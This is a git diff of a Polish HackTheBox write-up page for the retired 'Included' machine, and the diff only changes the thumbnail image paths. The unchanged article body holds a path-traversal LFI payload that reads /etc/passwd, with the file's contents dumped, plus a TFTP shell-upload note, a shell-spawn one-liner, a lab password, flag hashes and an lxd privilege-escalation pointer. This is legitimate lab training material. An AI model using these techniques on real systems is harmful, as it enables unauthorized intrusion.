@@ -61,13 +61,13 @@
 <meta property="og:description" content="Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup&rsquo;em :)" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://lavatann.github.io/posts/hackthebox/included/" />
-<meta property="og:image" content="https://lavatann.github.io/Included.png" /><meta property="article:section" content="posts" />
+<meta property="og:image" content="https://lavatann.github.io/thumbnails/Included.png" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-08-07T00:00:00&#43;00:00" />
 <meta property="article:modified_time" content="2021-08-07T00:00:00&#43;00:00" />
 <meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/encrypted/devzat/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/logforge/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/devzat/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/shibboleth/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/backdoor/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/secret/" />
 
 <meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:image" content="https://lavatann.github.io/Included.png" />
+<meta name="twitter:image" content="https://lavatann.github.io/thumbnails/Included.png" />
 <meta name="twitter:title" content="Included - HackTheBox"/>
 <meta name="twitter:description" content="Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup&rsquo;em :)"/>
 
@@ -105,7 +105,7 @@
   "articleBody": "Included - 07.08.2021  Nmap PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) | http-title: Site doesn't have a title (text/html; charset=UTF-8). |_Requested resource was http://10.10.10.55/?file=index.php  Nmap UDP sudo nmap -sU -v 10.10.10.55 PORT STATE SERVICE 69/udp open|filtered tftp  Strona główna  Local File Inclusion (LFI) Parametr file=../../../../../etc/passwd wyświetla:\nroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false mike:x:1000:1000:mike:/home/mike:/bin/bash tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin  Użytkownicy mike\n Info o systemie z LFI Linux version 4.15.0-88-generic (buildd@lgw01-amd64-036) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #88-Ubuntu SMP Tue Feb 11 20:11:34 UTC 2020\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n Upload shella na tftp Domyślna ścieżka uploudowanych rzeczy na tftp to /var/lib/tftpboot\nUzyskanie shella\npython3 -c 'import pty;pty.spawn (\"/bin/bash\")' Spawn cli\nHasło z poprzedniego boxa: Sheffield19\nuser.txt\na56ef91d70cfbf2cdb8f454c006935a1\n Linpeas lxd group\n Escalation https://steflan-security.com/linux-privilege-escalation-exploiting-the-lxc-lxd-groups/\nroot.txt\nc693d9c7499d9f572ee375d4c14c7bcf\n",
   "wordCount" : "153",
   "inLanguage": "en",
-  "image":"https://lavatann.github.io/Included.png","datePublished": "2021-08-07T00:00:00Z",
+  "image":"https://lavatann.github.io/thumbnails/Included.png","datePublished": "2021-08-07T00:00:00Z",
   "dateModified": "2021-08-07T00:00:00Z",
   "author":{
     "@type": "Person",
@@ -202,7 +202,7 @@
 
 </div>
   </header> 
-<figure class="entry-cover"><img loading="lazy" src="https://lavatann.github.io/Included.png" alt="">
+<figure class="entry-cover"><img loading="lazy" src="https://lavatann.github.io/thumbnails/Included.png" alt="">
         
 </figure><div class="toc">
     <details >
